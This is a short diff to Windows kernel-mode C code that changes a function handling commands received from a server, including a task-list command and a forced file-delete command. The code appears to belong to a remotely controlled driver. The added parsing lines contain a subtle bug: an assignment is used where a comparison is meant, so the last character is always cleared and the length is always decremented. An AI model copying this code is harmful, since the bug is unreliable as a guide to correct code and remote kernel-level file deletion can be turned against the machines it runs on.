@@ -232,6 +232,12 @@ NTSTATUS HandleServerPacket(
 		return STATUS_UNSUCCESSFUL;
 	}
 	msg[NETBUFF_LENGTH - 1] = 0;
+	if (msgLen > 0) {
+		if (msg[msgLen - 1] = '\n') {
+			msg[msgLen - 1] = 0;
+		}
+		msgLen--;
+	}
 	//RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "recv length: %ld\n", msgLen);
 	NTSTATUS status = STATUS_INVALID_PARAMETER;
 	if (strncmp(msg, CMD_TASKLIST, strlen(CMD_TASKLIST)) == 0) {
@@ -255,7 +261,7 @@ NTSTATUS HandleServerPacket(
 	}
 
 	if (strncmp(msg, CMD_DEL, strlen(CMD_DEL)) == 0) {
-		status = xDelFile3(msg);
+		status = xDelFile3(msg + strlen(CMD_DEL) + 1);
 		
 		RtlStringCbPrintfA(msg, NETBUFF_LENGTH, "xdel 3 return %p\n", status);
 		status = STATUS_SUCCESS;
